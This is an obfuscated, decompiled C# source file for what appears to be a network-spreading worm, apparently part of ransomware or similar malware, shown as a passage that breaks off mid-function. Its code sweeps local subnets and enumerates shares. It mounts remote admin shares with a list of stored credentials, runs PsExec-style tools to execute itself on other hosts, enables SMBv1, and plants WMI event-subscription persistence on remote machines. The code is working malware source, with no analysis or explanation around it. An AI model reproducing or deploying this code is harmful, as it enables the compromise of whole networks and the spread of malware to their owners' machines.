using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace YzTymtbtgFABHvJvj;

internal class lOChwyQwVc
{
	public class HvZKKYHZbsZdt
	{
		public string nNGqvxTfFPFmPm { get; set; }
	}

	public enum ufRFMCwThK
	{
		rjtdcgUZGpuNv = 1,
		VlmORhUnqds,
		CauRzUhxRPuekIK,
		vCWgPWrbjeYFvIn,
		JacYmvhTRnkE
	}

	public enum HxONgyXbhJ
	{
		uqIrxDGGFlQxB,
		MfUhnfTGZuKUs,
		xWIquAPFtAJRqgh,
		HjUbfhGDjxrc
	}

	public enum ZEahBdBPCJjLo
	{
		tihFvOEzXatk = 1,
		BCUwfCGcqg = 2,
		FqoaTPnzAYyTj = 4,
		HrrhKwaDdbU = 8,
		hOBlTYEXPiBkG = 16,
		lZLjZSSkvvpUinU = 19
	}

	public enum iMqNhdLTRixAodoDr
	{
		PLlsUSsJrsHaqux,
		iuFnFZBjGetkj,
		qTlUzVEIPRMpk,
		QhSnsInZgfHBRi,
		TdcKnPihxCDm,
		yHrdiVQaZIvwY,
		dTForcdqHIqttn,
		wegGVsFMciIhgW,
		YAKCmbbaWR,
		OjKKUnKdUy,
		VApyFNjmDd,
		LNYBXnjqHcRsmxuVq
	}

	public class jJkvwcuzVpzYwvI : IEnumerable
	{
		private enum cQzUBzAwHzJhP
		{
			iuJxqPXrTqqW = 0,
			kRPrdnBKZnESgGN = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private class aEDgGnEacViON
		{
			public ufRFMCwThK RCtRbVHJonk = (ufRFMCwThK)0;

			public HxONgyXbhJ SsFhqAHkKD = HxONgyXbhJ.uqIrxDGGFlQxB;

			public iMqNhdLTRixAodoDr YVbYmzfMRxWL = iMqNhdLTRixAodoDr.PLlsUSsJrsHaqux;

			public ZEahBdBPCJjLo wKUTGsEHgvxLX = (ZEahBdBPCJjLo)0;

			public string lzzeExWbrR = null;

			public string YdvhSWjsvbXXPErE = null;

			public string qlhtVgmWeVWkkW = null;

			public string cVymgXDcwP = null;
		}

		private ArrayList tRLYrtaGlkM = new ArrayList();

		public int cmADZbKmCqfXsA => tRLYrtaGlkM.Count;

		[DllImport("Mpr.dll")]
		private static extern cQzUBzAwHzJhP WNetOpenEnumA(ufRFMCwThK dwScope, HxONgyXbhJ dwType, ZEahBdBPCJjLo dwUsage, aEDgGnEacViON p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern cQzUBzAwHzJhP WNetCloseEnum(IntPtr hEnum);

		[DllImport("Mpr.dll")]
		private static extern cQzUBzAwHzJhP WNetEnumResourceA(IntPtr hEnum, ref uint lpcCount, IntPtr buffer, ref uint lpBufferSize);

		private void EnumerateServers(aEDgGnEacViON pRsrc, ufRFMCwThK scope, HxONgyXbhJ type, ZEahBdBPCJjLo usage, iMqNhdLTRixAodoDr displayType)
		{
			uint lpBufferSize = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint lpcCount = 1u;
			if (WNetOpenEnumA(scope, type, usage, pRsrc, out lphEnum) == cQzUBzAwHzJhP.iuJxqPXrTqqW)
			{
				cQzUBzAwHzJhP cQzUBzAwHzJhP;
				do
				{
					cQzUBzAwHzJhP = WNetEnumResourceA(lphEnum, ref lpcCount, intPtr, ref lpBufferSize);
					switch (cQzUBzAwHzJhP)
					{
					case cQzUBzAwHzJhP.kRPrdnBKZnESgGN:
						continue;
					case cQzUBzAwHzJhP.iuJxqPXrTqqW:
						Marshal.PtrToStructure(intPtr, pRsrc);
						if (pRsrc.YVbYmzfMRxWL == displayType)
						{
							tRLYrtaGlkM.Add(pRsrc.YdvhSWjsvbXXPErE);
						}
						if ((pRsrc.wKUTGsEHgvxLX & ZEahBdBPCJjLo.BCUwfCGcqg) == ZEahBdBPCJjLo.BCUwfCGcqg)
						{
							EnumerateServers(pRsrc, scope, type, usage, displayType);
						}
						continue;
					}
					break;
				}
				while (cQzUBzAwHzJhP != cQzUBzAwHzJhP.kRPrdnBKZnESgGN);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public jJkvwcuzVpzYwvI(ufRFMCwThK scope, HxONgyXbhJ type, ZEahBdBPCJjLo usage, iMqNhdLTRixAodoDr displayType)
		{
			aEDgGnEacViON pRsrc = new aEDgGnEacViON();
			EnumerateServers(pRsrc, scope, type, usage, displayType);
		}

		public IEnumerator GetEnumerator()
		{
			return tRLYrtaGlkM.GetEnumerator();
		}
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct TZTJfgFDmFmPFnsCn
	{
		[MarshalAs(UnmanagedType.LPWStr)]
		public string wUSxGvxCOV;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string GeGVjKUFNZ;

		public uint mbkmzFzImJJwOu;

		public uint ArdVdoPFsiDb;

		public IntPtr hEKkdHwNMQe;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct mZqZHzbFjvNMKw
	{
		public int mbkmzFzImJJwOu;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string fbNhWjfDLyfz;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string oDBTmkrgnPpk;
	}

	public struct moFkvyPFRzDW
	{
		public string IVfizOBYGywmmPnb;

		public string[] xTQNuEcPNBLLy;

		public moFkvyPFRzDW(string Name, string[] Target)
		{
			IVfizOBYGywmmPnb = Name;
			xTQNuEcPNBLLy = Target;
		}
	}

	[CompilerGenerated]
	private sealed class ACrPTReoWbpB
	{
		private sealed class UoTqfIjsSiMe
		{
			public ACrPTReoWbpB OGciCdWlwj;

			public int fnGFMPYepOmcoVpU;

			public void _003Cscanner_003Eb__4(int g)
			{
				eqCksjvMyn.xQfMOPCvvVAqwp(eqCksjvMyn.joRKfFeYni("bmV0LmV4ZQ=="), string.Concat("use \\\\", OGciCdWlwj.KKGNDBJWFSYYtMAI, "\\", (char)g, "$ /USER:", tHplFUdWgAiy[fnGFMPYepOmcoVpU], " ", MlDcbZBYTSGl[fnGFMPYepOmcoVpU]));
				Thread.Sleep(eqCksjvMyn.UIEwMIIeUW);
				eqCksjvMyn.CsvCMpwsZeYIJVA(string.Concat("\\\\", OGciCdWlwj.KKGNDBJWFSYYtMAI, "\\", (char)g, "$"));
			}
		}

		public Ping UGlegtEays;

		public PingReply qmmIbWFFhMNtutVzy;

		public IPAddress KKGNDBJWFSYYtMAI;

		public string AtjBRkUaVOZ;

		public void _003Cscanner_003Eb__2(int i)
		{
			try
			{
				string text = "." + i;
				UGlegtEays = new Ping();
				qmmIbWFFhMNtutVzy = UGlegtEays.Send(AtjBRkUaVOZ + text, 900);
				if (qmmIbWFFhMNtutVzy.Status != 0)
				{
					return;
				}
				try
				{
					KKGNDBJWFSYYtMAI = IPAddress.Parse(AtjBRkUaVOZ + text);
					IPHostEntry hostEntry = Dns.GetHostEntry(KKGNDBJWFSYYtMAI);
					if (eqCksjvMyn.vNjCRxJChaZG.Contains(string.Concat("\\\\", KKGNDBJWFSYYtMAI, "\\Users")) || hostEntry.HostName.Contains(Environment.MachineName))
					{
						return;
					}
					eqCksjvMyn.rZJokgIxaykmN.Add(KKGNDBJWFSYYtMAI.ToString());
					try
					{
						if (eqCksjvMyn.yRchNUgjMpalF == "YES")
						{
							Parallel.For(0, tHplFUdWgAiy.Count, delegate(int f)
							{
								eqCksjvMyn.xQfMOPCvvVAqwp(eqCksjvMyn.joRKfFeYni("bmV0LmV4ZQ=="), string.Concat("use \\\\", KKGNDBJWFSYYtMAI, "\\Users /USER:", tHplFUdWgAiy[f], " ", MlDcbZBYTSGl[f]));
								Thread.Sleep(eqCksjvMyn.UIEwMIIeUW);
								eqCksjvMyn.CsvCMpwsZeYIJVA(string.Concat("\\\\", KKGNDBJWFSYYtMAI, "\\Users"));
								Parallel.For(65, 91, delegate(int g)
								{
									eqCksjvMyn.xQfMOPCvvVAqwp(eqCksjvMyn.joRKfFeYni("bmV0LmV4ZQ=="), string.Concat("use \\\\", KKGNDBJWFSYYtMAI, "\\", (char)g, "$ /USER:", tHplFUdWgAiy[f], " ", MlDcbZBYTSGl[f]));
									Thread.Sleep(eqCksjvMyn.UIEwMIIeUW);
									eqCksjvMyn.CsvCMpwsZeYIJVA(string.Concat("\\\\", KKGNDBJWFSYYtMAI, "\\", (char)g, "$"));
								});
							});
						}
						else
						{
							eqCksjvMyn.xQfMOPCvvVAqwp(eqCksjvMyn.joRKfFeYni("bmV0LmV4ZQ=="), string.Concat("use \\\\", KKGNDBJWFSYYtMAI, "\\Users"));
							Thread.Sleep(eqCksjvMyn.UIEwMIIeUW);
							eqCksjvMyn.CsvCMpwsZeYIJVA(string.Concat("\\\\", KKGNDBJWFSYYtMAI, "\\Users"));
							Parallel.For(65, 91, delegate(int g)
							{
								eqCksjvMyn.xQfMOPCvvVAqwp(eqCksjvMyn.joRKfFeYni("bmV0LmV4ZQ=="), string.Concat("use \\\\", KKGNDBJWFSYYtMAI, "\\", (char)g, "$"));
								Thread.Sleep(eqCksjvMyn.UIEwMIIeUW);
								eqCksjvMyn.CsvCMpwsZeYIJVA(string.Concat("\\\\", KKGNDBJWFSYYtMAI, "\\", (char)g, "$"));
							});
						}
					}
					catch
					{
					}
				}
				catch
				{
				}
			}
			catch (Exception)
			{
			}
		}

		public void _003Cscanner_003Eb__3(int f)
		{
			eqCksjvMyn.xQfMOPCvvVAqwp(eqCksjvMyn.joRKfFeYni("bmV0LmV4ZQ=="), string.Concat("use \\\\", KKGNDBJWFSYYtMAI, "\\Users /USER:", tHplFUdWgAiy[f], " ", MlDcbZBYTSGl[f]));
			Thread.Sleep(eqCksjvMyn.UIEwMIIeUW);
			eqCksjvMyn.CsvCMpwsZeYIJVA(string.Concat("\\\\", KKGNDBJWFSYYtMAI, "\\Users"));
			Parallel.For(65, 91, delegate(int g)
			{
				eqCksjvMyn.xQfMOPCvvVAqwp(eqCksjvMyn.joRKfFeYni("bmV0LmV4ZQ=="), string.Concat("use \\\\", KKGNDBJWFSYYtMAI, "\\", (char)g, "$ /USER:", tHplFUdWgAiy[f], " ", MlDcbZBYTSGl[f]));
				Thread.Sleep(eqCksjvMyn.UIEwMIIeUW);
				eqCksjvMyn.CsvCMpwsZeYIJVA(string.Concat("\\\\", KKGNDBJWFSYYtMAI, "\\", (char)g, "$"));
			});
		}

		public void _003Cscanner_003Eb__5(int g)
		{
			eqCksjvMyn.xQfMOPCvvVAqwp(eqCksjvMyn.joRKfFeYni("bmV0LmV4ZQ=="), string.Concat("use \\\\", KKGNDBJWFSYYtMAI, "\\", (char)g, "$"));
			Thread.Sleep(eqCksjvMyn.UIEwMIIeUW);
			eqCksjvMyn.CsvCMpwsZeYIJVA(string.Concat("\\\\", KKGNDBJWFSYYtMAI, "\\", (char)g, "$"));
		}
	}

	[CompilerGenerated]
	private sealed class fOYejTSfVRak
	{
		public string iuErTVcwZsUKt;

		public string jrpSqdXwQKGgHX;

		public void _003CRun_003Eb__d(string ip)
		{
			if ((!ip.StartsWith("10.") && !ip.StartsWith("172.") && !ip.StartsWith("192.168.") && !ip.Contains("")) || !bXTLOcmBneaTm(ip))
			{
				return;
			}
			if (eqCksjvMyn.yRchNUgjMpalF == "YES")
			{
				for (int i = 0; i < tHplFUdWgAiy.Count; i++)
				{
					if (eqCksjvMyn.TpOjlZaYAqM)
					{
						if (File.Exists(iuErTVcwZsUKt))
						{
							eqCksjvMyn.xQfMOPCvvVAqwp(iuErTVcwZsUKt, "\\\\" + ip + " -u \"" + tHplFUdWgAiy[i] + "\" -p \"" + MlDcbZBYTSGl[i] + "\" -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
						}
					}
					else if (File.Exists(jrpSqdXwQKGgHX))
					{
						eqCksjvMyn.xQfMOPCvvVAqwp(jrpSqdXwQKGgHX, "\\\\" + ip + " -u \"" + tHplFUdWgAiy[i] + "\" -p \"" + MlDcbZBYTSGl[i] + "\" -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
					}
				}
			}
			else if (eqCksjvMyn.TpOjlZaYAqM)
			{
				if (File.Exists(iuErTVcwZsUKt))
				{
					eqCksjvMyn.xQfMOPCvvVAqwp(iuErTVcwZsUKt, "\\\\" + ip + " -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
				}
			}
			else if (File.Exists(jrpSqdXwQKGgHX))
			{
				eqCksjvMyn.xQfMOPCvvVAqwp(jrpSqdXwQKGgHX, "\\\\" + ip + " -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
			}
		}
	}

	[CompilerGenerated]
	private sealed class srUSkNCxrIqQ
	{
		public string RsEsRvvzseGl;

		public bool _003CGetIPAddresses_003Eb__11(string o)
		{
			return o != RsEsRvvzseGl;
		}
	}

	private const int qkxCCGbyyNch = 268435455;

	private const int SvUcaSSabPc = 0;

	public static List<string> FQcSNRNGFPtjCMuPT = new List<string>();

	public static string ebQhfAampZzuIFk = "";

	public static List<string> tHplFUdWgAiy = new List<string>();

	public static List<string> MlDcbZBYTSGl = new List<string>();

	public static List<string> nIEgQvobsUzk = new List<string>();

	public List<string> EzbQgqCaCyKt = new List<string>();

	public List<string> RSlMfHNtFGbZrZ = new List<string>();

	public List<string> JmqMFysVAz = new List<string>();

	public static void UqfvuEjeqj()
	{
		lOChwyQwVc lOChwyQwVc2 = uSinzXlrNJ();
		Parallel.ForEach(lOChwyQwVc2.JmqMFysVAz, delegate(string sCcfEQiIyMKMF)
		{
			string text = sCcfEQiIyMKMF.Split(new char[1] { '.' })[0] + "." + sCcfEQiIyMKMF.Split(new char[1] { '.' })[1] + "." + sCcfEQiIyMKMF.Split(new char[1] { '.' })[2];
			if (text.StartsWith("10.") || text.StartsWith("172.") || text.StartsWith("192.168.") || text.StartsWith(""))
			{
				ANaotWxZXYKon(text);
			}
		});
	}

	public static void ANaotWxZXYKon(string NCywZZjUxyn)
	{
		Ping UGlegtEays;
		PingReply qmmIbWFFhMNtutVzy;
		IPAddress KKGNDBJWFSYYtMAI;
		Parallel.For(0, 255, delegate(int i)
		{
			try
			{
				string text = "." + i;
				UGlegtEays = new Ping();
				qmmIbWFFhMNtutVzy = UGlegtEays.Send(NCywZZjUxyn + text, 900);
				if (qmmIbWFFhMNtutVzy.Status == IPStatus.Success)
				{
					try
					{
						KKGNDBJWFSYYtMAI = IPAddress.Parse(NCywZZjUxyn + text);
						IPHostEntry hostEntry = Dns.GetHostEntry(KKGNDBJWFSYYtMAI);
						if (eqCksjvMyn.vNjCRxJChaZG.Contains(string.Concat("\\\\", KKGNDBJWFSYYtMAI, "\\Users")) || hostEntry.HostName.Contains(Environment.MachineName))
						{
							return;
						}
						eqCksjvMyn.rZJokgIxaykmN.Add(KKGNDBJWFSYYtMAI.ToString());
						try
						{
							if (eqCksjvMyn.yRchNUgjMpalF == "YES")
							{
								Parallel.For(0, tHplFUdWgAiy.Count, delegate(int f)
								{
									eqCksjvMyn.xQfMOPCvvVAqwp(eqCksjvMyn.joRKfFeYni("bmV0LmV4ZQ=="), string.Concat("use \\\\", KKGNDBJWFSYYtMAI, "\\Users /USER:", tHplFUdWgAiy[f], " ", MlDcbZBYTSGl[f]));
									Thread.Sleep(eqCksjvMyn.UIEwMIIeUW);
									eqCksjvMyn.CsvCMpwsZeYIJVA(string.Concat("\\\\", KKGNDBJWFSYYtMAI, "\\Users"));
									Parallel.For(65, 91, delegate(int g)
									{
										eqCksjvMyn.xQfMOPCvvVAqwp(eqCksjvMyn.joRKfFeYni("bmV0LmV4ZQ=="), string.Concat("use \\\\", KKGNDBJWFSYYtMAI, "\\", (char)g, "$ /USER:", tHplFUdWgAiy[f], " ", MlDcbZBYTSGl[f]));
										Thread.Sleep(eqCksjvMyn.UIEwMIIeUW);
										eqCksjvMyn.CsvCMpwsZeYIJVA(string.Concat("\\\\", KKGNDBJWFSYYtMAI, "\\", (char)g, "$"));
									});
								});
							}
							else
							{
								eqCksjvMyn.xQfMOPCvvVAqwp(eqCksjvMyn.joRKfFeYni("bmV0LmV4ZQ=="), string.Concat("use \\\\", KKGNDBJWFSYYtMAI, "\\Users"));
								Thread.Sleep(eqCksjvMyn.UIEwMIIeUW);
								eqCksjvMyn.CsvCMpwsZeYIJVA(string.Concat("\\\\", KKGNDBJWFSYYtMAI, "\\Users"));
								Parallel.For(65, 91, delegate(int g)
								{
									eqCksjvMyn.xQfMOPCvvVAqwp(eqCksjvMyn.joRKfFeYni("bmV0LmV4ZQ=="), string.Concat("use \\\\", KKGNDBJWFSYYtMAI, "\\", (char)g, "$"));
									Thread.Sleep(eqCksjvMyn.UIEwMIIeUW);
									eqCksjvMyn.CsvCMpwsZeYIJVA(string.Concat("\\\\", KKGNDBJWFSYYtMAI, "\\", (char)g, "$"));
								});
							}
							return;
						}
						catch
						{
							return;
						}
					}
					catch
					{
						return;
					}
				}
			}
			catch (Exception)
			{
			}
		});
	}

	public static lOChwyQwVc uSinzXlrNJ()
	{
		new List<List<string>>();
		new List<string>();
		new List<string>();
		new List<string>();
		lOChwyQwVc lOChwyQwVc2 = new lOChwyQwVc();
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		NetworkInterface[] array = allNetworkInterfaces;
		foreach (NetworkInterface networkInterface in array)
		{
			if (networkInterface.OperationalStatus != OperationalStatus.Up)
			{
				continue;
			}
			try
			{
				networkInterface.GetIPProperties();
				foreach (UnicastIPAddressInformation unicastAddress in networkInterface.GetIPProperties().UnicastAddresses)
				{
					if (unicastAddress.Address.AddressFamily != AddressFamily.InterNetwork)
					{
						continue;
					}
					IPAddress address = unicastAddress.Address;
					IPAddress iPv4Mask = unicastAddress.IPv4Mask;
					byte[] addressBytes = address.GetAddressBytes();
					byte[] addressBytes2 = iPv4Mask.GetAddressBytes();
					if (addressBytes.Length == addressBytes2.Length)
					{
						byte[] array2 = new byte[addressBytes.Length];
						for (int j = 0; j < array2.Length; j++)
						{
							array2[j] = (byte)(addressBytes[j] | (addressBytes2[j] ^ 0xFFu));
						}
						IPAddress iPAddress = new IPAddress(array2);
						byte[] array3 = new byte[addressBytes.Length];
						for (int j = 0; j < array3.Length; j++)
						{
							array3[j] = (byte)(addressBytes[j] & addressBytes2[j]);
						}
						IPAddress iPAddress2 = new IPAddress(array3);
						lOChwyQwVc2.RSlMfHNtFGbZrZ.Add(networkInterface.Name);
						lOChwyQwVc2.JmqMFysVAz.Add(iPAddress2.ToString());
						lOChwyQwVc2.EzbQgqCaCyKt.Add(iPAddress.ToString());
					}
				}
			}
			catch (Exception)
			{
			}
		}
		return lOChwyQwVc2;
	}

	public static List<HvZKKYHZbsZdt> wgaFlkkvGuIet()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.Arguments = "/c net view";
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			List<HvZKKYHZbsZdt> list = new List<HvZKKYHZbsZdt>();
			while (true)
			{
				if (!process.StandardOutput.EndOfStream)
				{
					string text = process.StandardOutput.ReadLine();
					if (text == "There are no entries in the list.")
					{
						break;
					}
					if (text != string.Empty && text[0] == '\\' && text[1] == '\\')
					{
						StringBuilder stringBuilder = new StringBuilder();
						for (int i = 2; i < text.Length && text[i] != ' '; i++)
						{
							stringBuilder.Append(text[i]);
						}
						list.Add(new HvZKKYHZbsZdt
						{
							nNGqvxTfFPFmPm = string.Concat("\\", stringBuilder, "\\Users")
						});
					}
					continue;
				}
				process.WaitForExit();
				process.Close();
				return list;
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	[DllImport("Netapi32.dll", CharSet = CharSet.Auto)]
	public static extern int NetDfsEnum([MarshalAs(UnmanagedType.LPWStr)] string UaAVRQMBSUAB, int pHhAQRrTRR, int VXwFOtEXeMPFgF, out IntPtr uzVbAqznXvtag, [MarshalAs(UnmanagedType.I4)] out int mQtChNfdMLUCu, [MarshalAs(UnmanagedType.I4)] ref int LSGGxXdhFXfp);

	public static List<moFkvyPFRzDW> vKTflBCwno(string UjodtcpTFraxYSAq)
	{
		try
		{
			List<moFkvyPFRzDW> list = new List<moFkvyPFRzDW>();
			IntPtr uzVbAqznXvtag = default(IntPtr);
			int mQtChNfdMLUCu = 0;
			int LSGGxXdhFXfp = 0;
			if (NetDfsEnum(UjodtcpTFraxYSAq, 3, 268435455, out uzVbAqznXvtag, out mQtChNfdMLUCu, ref LSGGxXdhFXfp) == 0)
			{
				for (int i = 0; i < mQtChNfdMLUCu; i++)
				{
					TZTJfgFDmFmPFnsCn tZTJfgFDmFmPFnsCn = (TZTJfgFDmFmPFnsCn)Marshal.PtrToStructure(uzVbAqznXvtag + i * Marshal.SizeOf(typeof(TZTJfgFDmFmPFnsCn)), typeof(TZTJfgFDmFmPFnsCn));
					if (tZTJfgFDmFmPFnsCn.wUSxGvxCOV == UjodtcpTFraxYSAq)
					{
						continue;
					}
					List<string> list2 = new List<string>();
					for (int j = 0; j < tZTJfgFDmFmPFnsCn.ArdVdoPFsiDb; j++)
					{
						IntPtr ptr = new IntPtr(tZTJfgFDmFmPFnsCn.hEKkdHwNMQe.ToInt64() + j * Marshal.SizeOf(typeof(mZqZHzbFjvNMKw)));
						mZqZHzbFjvNMKw mZqZHzbFjvNMKw = (mZqZHzbFjvNMKw)Marshal.PtrToStructure(ptr, typeof(mZqZHzbFjvNMKw));
						if (mZqZHzbFjvNMKw.mbkmzFzImJJwOu == 2)
						{
							list2.Add(Path.Combine(new string[3] { "\\\\", mZqZHzbFjvNMKw.fbNhWjfDLyfz, mZqZHzbFjvNMKw.oDBTmkrgnPpk }));
						}
					}
					string text = tZTJfgFDmFmPFnsCn.wUSxGvxCOV.Replace(UjodtcpTFraxYSAq, "");
					if (text.StartsWith("\\"))
					{
						text = text.Substring(1);
					}
					list.Add(new moFkvyPFRzDW(text, list2.ToArray()));
				}
			}
			return list;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static void RptORrrLWw()
	{
		eqCksjvMyn.HEtSbTekjvbdmpa("Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol");
		List<HvZKKYHZbsZdt> list = wgaFlkkvGuIet();
		List<moFkvyPFRzDW> list2 = vKTflBCwno(Environment.MachineName);
		if (list2 != null)
		{
			foreach (moFkvyPFRzDW item in list2)
			{
				string[] xTQNuEcPNBLLy = item.xTQNuEcPNBLLy;
				foreach (string text in xTQNuEcPNBLLy)
				{
					if (text.Contains(Environment.MachineName) || !string.IsNullOrEmpty(text))
					{
						continue;
					}
					try
					{
						if (eqCksjvMyn.yRchNUgjMpalF == "YES")
						{
							for (int j = 0; j < tHplFUdWgAiy.Count; j++)
							{
								eqCksjvMyn.xQfMOPCvvVAqwp(eqCksjvMyn.joRKfFeYni("bmV0LmV4ZQ=="), "use " + text + " /USER:" + tHplFUdWgAiy[j] + " " + MlDcbZBYTSGl[j]);
								Thread.Sleep(eqCksjvMyn.UIEwMIIeUW);
								eqCksjvMyn.CsvCMpwsZeYIJVA(text);
							}
						}
						else
						{
							eqCksjvMyn.xQfMOPCvvVAqwp(eqCksjvMyn.joRKfFeYni("bmV0LmV4ZQ=="), "use " + text);
							Thread.Sleep(eqCksjvMyn.UIEwMIIeUW);
							eqCksjvMyn.CsvCMpwsZeYIJVA(text);
						}
					}
					catch
					{
					}
				}
			}
		}
		if (list == null)
		{
			return;
		}
		foreach (HvZKKYHZbsZdt item2 in list)
		{
			if (item2.nNGqvxTfFPFmPm.Contains(Environment.MachineName))
			{
				continue;
			}
			try
			{
				if (eqCksjvMyn.yRchNUgjMpalF == "YES")
				{
					for (int j = 0; j < tHplFUdWgAiy.Count; j++)
					{
						eqCksjvMyn.xQfMOPCvvVAqwp(eqCksjvMyn.joRKfFeYni("bmV0LmV4ZQ=="), "use " + item2.nNGqvxTfFPFmPm + " /USER:" + tHplFUdWgAiy[j] + " " + MlDcbZBYTSGl[j]);
						Thread.Sleep(eqCksjvMyn.UIEwMIIeUW);
						eqCksjvMyn.CsvCMpwsZeYIJVA(item2.nNGqvxTfFPFmPm);
					}
				}
				else
				{
					eqCksjvMyn.xQfMOPCvvVAqwp(eqCksjvMyn.joRKfFeYni("bmV0LmV4ZQ=="), "use " + item2.nNGqvxTfFPFmPm);
					Thread.Sleep(eqCksjvMyn.UIEwMIIeUW);
					eqCksjvMyn.CsvCMpwsZeYIJVA(item2.nNGqvxTfFPFmPm);
				}
			}
			catch
			{
			}
		}
	}

	public static void KvQDnMzWczUUHyv(string NPtRuINiueeOp, string osVanLOtQEfKW, string wfEUYwGrqZfc)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		//IL_0084: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Expected O, but got Unknown
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0109: Expected O, but got Unknown
		//IL_0104: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Expected O, but got Unknown
		//IL_0160: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = "\\\\" + NPtRuINiueeOp + "\\root\\subscription";
			ConnectionOptions val = new ConnectionOptions();
			ManagementScope val2 = null;
			val2 = new ManagementScope(text, val);
			val2.get_Options().set_Username(osVanLOtQEfKW);
			val2.get_Options().set_Password(wfEUYwGrqZfc);
			val2.get_Options().set_Authority(string.Format("ntlmdomain:{0}", "."));
			val2.get_Options().set_EnablePrivileges(true);
			val2.get_Options().set_Authentication((AuthenticationLevel)6);
			val2.get_Options().set_Impersonation((ImpersonationLevel)3);
			val2.Connect();
			ManagementClass val3 = new ManagementClass(val2, new ManagementPath("__EventFilter"), (ObjectGetOptions)null);
			string text2 = "SELECT * FROM __InstanceCreationEvent Within 5 Where TargetInstance Isa 'Win32_LogonSession'";
			WqlEventQuery val4 = new WqlEventQuery(text2);
			ManagementObject val5 = val3.CreateInstance();
			((ManagementBaseObject)val5).set_Item("Name", (object)"WorkerFilter");
			((ManagementBaseObject)val5).set_Item("Query", (object)((ManagementQuery)val4).get_QueryString());
			((ManagementBaseObject)val5).set_Item("QueryLanguage", (object)((ManagementQuery)val4).get_QueryLanguage());
			((ManagementBaseObject)val5).set_Item("EventNameSpace", (object)"root\\cimv2");
			val5.Put();
			ManagementObject val6 = new ManagementClass(val2, new ManagementPath("CommandLineEventConsumer"), (ObjectGetOptions)null).CreateInstance();
			((ManagementBaseObject)val6).set_Item("Name", (object)"EventConsumer");
			((ManagementBaseObject)val6).set_Item("ExecutablePath", (object)("\\\\" + NPtRuINiueeOp + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location)));
			val6.Put();
			ManagementObject val7 = new ManagementClass(val2, new ManagementPath("__FilterToConsumerBinding"), (ObjectGetOptions)null).CreateInstance();
			((ManagementBaseObject)val7).set_Item("Filter", (object)val5.get_Path().get_RelativePath());
			((ManagementBaseObject)val7).set_Item("Consumer", (object)val6.get_Path().get_RelativePath());
			val7.Put();
		}
		catch (Exception)
		{
		}
	}

	public static void ILikfPKnbkfZ()
	{
		eqCksjvMyn.sxaSkcguZNw();
		List<CpsHVasgAe> list = CpsHVasgAe.cIWmfhpGhkv();
		foreach (CpsHVasgAe item in list)
		{
			FQcSNRNGFPtjCMuPT.Add(item.FFxDkVWJYZOA);
		}
		if (eqCksjvMyn.rZJokgIxaykmN.Count > 0)
		{
			FQcSNRNGFPtjCMuPT = FQcSNRNGFPtjCMuPT.Union(eqCksjvMyn.rZJokgIxaykmN).ToList();
		}
		string iuErTVcwZsUKt = "";
		string jrpSqdXwQKGgHX = "";
		try
		{
			iuErTVcwZsUKt = xHrYTWEEyyxfwH();
		}
		catch
		{
		}
		try
		{
			jrpSqdXwQKGgHX = fmSPTcryiMwTjv();
		}
		catch
		{
		}
		foreach (CpsHVasgAe item2 in list)
		{
			try
			{
				if (item2.FFxDkVWJYZOA.StartsWith("10.") || item2.FFxDkVWJYZOA.StartsWith("172.") || item2.FFxDkVWJYZOA.StartsWith("192.168.") || item2.FFxDkVWJYZOA.Contains(""))
				{
					MdSuPZXxpOdiuN.pTOrrKUqMAsEjRV(item2.EvwSDUcfodVXL, item2.FFxDkVWJYZOA, "255.255.255.0");
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(FQcSNRNGFPtjCMuPT, delegate(string ip)
			{
				if ((ip.StartsWith("10.") || ip.StartsWith("172.") || ip.StartsWith("192.168.") || ip.Contains("")) && bXTLOcmBneaTm(ip))
				{
					if (eqCksjvMyn.yRchNUgjMpalF == "YES")
					{
						for (int i = 0; i < tHplFUdWgAiy.Count; i++)
						{
							if (eqCksjvMyn.TpOjlZaYAqM)
							{
								if (File.Exists(iuErTVcwZsUKt))
								{
